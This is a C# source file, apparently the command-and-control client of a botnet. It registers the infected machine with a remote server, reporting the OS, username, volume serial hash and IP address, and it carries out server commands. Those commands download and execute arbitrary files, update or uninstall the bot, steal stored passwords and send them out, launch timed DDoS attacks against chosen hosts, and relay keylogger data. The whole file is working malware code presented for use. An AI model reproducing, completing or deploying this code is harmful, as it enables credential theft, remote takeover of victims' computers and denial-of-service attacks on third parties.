using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;

using Stub;
using Stub.Network;
using Stub.Network.Protocol;
using Stub.Core.Config;
using Stub.Utilities;
using Stub.Core.Modules.Startup;
using Stub.Core;
using Stub.Core.Modules.DDoS;
using System.Threading;
using Stub.Core.Modules.Stealer;
using System.Windows.Forms;

namespace Stub.Network.Gopnik
{
    enum BOT_PACKET : byte
    {
        IDENT = 0x1,
        TASK = 0x2,
        DDOS = 0x3,
        STEALER = 0x4,
        KEYLOGS = 0x5,
        PING = 0x6
    }

    enum BOT_TASK : byte
    {
        DOWNLOAD_EXECUTE = 0x0,
        UPDATE = 0x1,
        UNINSTALL = 0x2,
        STEALER = 0x3
    }

    class CGopnikClient
    {
        private CClientSocket m_ClientSocket = null;

        public CGopnikClient()
        {
            m_ClientSocket = new CClientSocket(CBot.BotConfig.Host, CBot.BotConfig.Port, CBot.BotConfig.Tor_Host, CBot.BotConfig.Tor_Port);
            m_ClientSocket.OnClientConnected += m_ClientSocket_OnClientConnected;
            m_ClientSocket.OnClientReceiveData += m_ClientSocket_OnClientReceiveData;
            m_ClientSocket.OnClientDisconnect += m_ClientSocket_OnClientDisconnect;

            CDDoSHandler.OnDdosInfo += CDDoSHandler_OnDdosInfo;
        }

        void CDDoSHandler_OnDdosInfo(int iAttackID, int iRate, int iPPS)
        {
            this.SendDdosInfo(iAttackID, iRate, iPPS);
        }

        public Boolean IsRunning()
        {
            if (m_ClientSocket == null) return false;

            return m_ClientSocket.IsRunning();
        }

        public bool IsConnected()
        {
            return m_ClientSocket.IsConnected();
        }

        public void Start()
        {
            m_ClientSocket.Start();
        }

        public void Stop()
        {
            m_ClientSocket.Stop();
        }

        void m_ClientSocket_OnClientReceiveData(BOT_PACKET Packet, byte[] arr_bArguments)
        {
            string[] arr_strArguments = null;
            
            if(arr_bArguments != null)
                arr_strArguments = UnicodeEncoding.Unicode.GetString(arr_bArguments, 0, arr_bArguments.Length).Split('|');

            switch(Packet)
            {
                case BOT_PACKET.TASK:
                    {
                        /*
                         * arr_bArguments[1] = Task
                         * arr_bArguments[2...] = Parameters
                         */

                        //BOT_TASK Task = (BOT_TASK)arr_bArguments[0];

                        int iTaskID = -1;

                        if (!int.TryParse(arr_strArguments[0], out iTaskID))
                            break;

                        int iTask = -1;

                        if (!int.TryParse(arr_strArguments[1], out iTask))
                            break;

                        BOT_TASK Task = (BOT_TASK)iTask;

                        string strParameters = arr_strArguments[2];

                        string[] arr_strParameters = null;

                        if (!string.IsNullOrEmpty(strParameters))
                            arr_strParameters = strParameters.Split(' ');

                        switch (Task)
                        {
                            case BOT_TASK.DOWNLOAD_EXECUTE:
                                {
                                    if (arr_strParameters.Length != 1)
                                        break;

                                    if (CUtils.DownloadFile(arr_strParameters[0]))
                                    {
                                        this.SendTaskExecuted(iTaskID);
                                    }
                                }
                                break;
                            case BOT_TASK.UPDATE:
                                {
                                    if (arr_strParameters.Length != 1)
                                        break;

                                    if (CUtils.DownloadFile(arr_strParameters[0]) && CMalwareStartup.UninstallBot())
                                    {
                                        this.SendTaskExecuted(iTaskID);
                                        Application.Exit();
                                        Environment.Exit(0);
                                    }
                                }
                                break;
                            case BOT_TASK.UNINSTALL:
                                {
                                    if (CMalwareStartup.UninstallBot() && this.SendTaskExecuted(iTaskID))
                                    {
                                        Application.Exit();
                                        Environment.Exit(0);
                                    }
                                }
                                break;
                            case BOT_TASK.STEALER:
                                {
                                    if (this.SendPacket(BOT_PACKET.STEALER, CPasswordStealer.GetPasswords()))
                                        this.SendTaskExecuted(iTaskID);
                                }
                                break;
                            default: break;
                        }
                    }
                    break;
                case BOT_PACKET.DDOS:
                    {
                        if (arr_strArguments == null ||
                            arr_strArguments.Length != 1 && arr_strArguments.Length != 6 && arr_strArguments.Length != 7) break;

                        /*
                         * [0] = ID
                         * [1] = Host
                         * [2] = Port
                         * [3] = Type
                         * [4] = Hours
                         */

                        int iAttackID;
                        
                        if (!int.TryParse(arr_strArguments[0], out iAttackID)) break;

                        if (arr_strArguments.Length > 1)
                        {
                            int iPort, iType, iInterval, iSockets;

                            if (!int.TryParse(arr_strArguments[2], out iPort) ||
                                !int.TryParse(arr_strArguments[3], out iType) ||
                                !int.TryParse(arr_strArguments[4], out iSockets) ||
                                !int.TryParse(arr_strArguments[5], out iInterval)) break;

                            DateTime? EndDate = null;

                            if (arr_strArguments.Length == 7)
                            {
                                double dHours = -1;
                                if (!double.TryParse(arr_strArguments[6], out dHours)) break;

                                EndDate = DateTime.Now;
                                EndDate = EndDate.Value.AddHours(dHours);
                            }

                            if(CDDoSHandler.StartAttack(iAttackID, iType, arr_strArguments[1], iPort, EndDate, iSockets, iInterval))
                            {
                                this.SendDdosStarted(iAttackID);
                            }
                        }
                        else CDDoSHandler.StopAttack(iAttackID);
                    }
                    break;
                case BOT_PACKET.PING:
                    this.SendPacket(BOT_PACKET.PING, string.Format(
                        "{0}",
                        CUtils.GetCPUUsage()
                        ));
                    break;
                default: break;
            }

        }

        void m_ClientSocket_OnClientDisconnect()
        {
            
        }

        void m_ClientSocket_OnClientConnected()
        {
            CDDoSHandler.StopAll();

            CPacket Packet = m_ClientSocket.CreatePacket((Byte)BOT_PACKET.IDENT, String.Format("{0}|{1}|{2}|{3}|{4}", CBot.BotConfig.BotVersion, CUtils.GetOS(), CUtils.GetUsername(), CUtils.GetSHA1(CUtils.GetVolumeSerial()), CUtils.GetIPv4()));

            if (!m_ClientSocket.SendPacket(Packet))
                m_ClientSocket.Disconnect();
        }

        bool SendPacket(BOT_PACKET Packet, string strArguments)
        {
            try
            {
                return m_ClientSocket.SendPacket(m_ClientSocket.CreatePacket((byte)Packet, strArguments));
            }
            catch { }

            return false;
        }

        Boolean SendTaskExecuted(Int32 iID)
        {
            return this.SendPacket(BOT_PACKET.TASK, iID.ToString());
        }

        void SendDdosStarted(int iAttackID)
        {
            this.SendPacket(BOT_PACKET.DDOS, iAttackID.ToString());
        }

        void SendDdosInfo(int iAttackID, int iRate, int iPPS)
        {
            this.SendPacket(BOT_PACKET.DDOS, string.Format("{0}|{1}|{2}", iAttackID, iRate, iPPS));
        }

        public void SendKeyloggerData(string strData)
        {
            this.SendPacket(BOT_PACKET.KEYLOGS, strData);
        }
    }
}
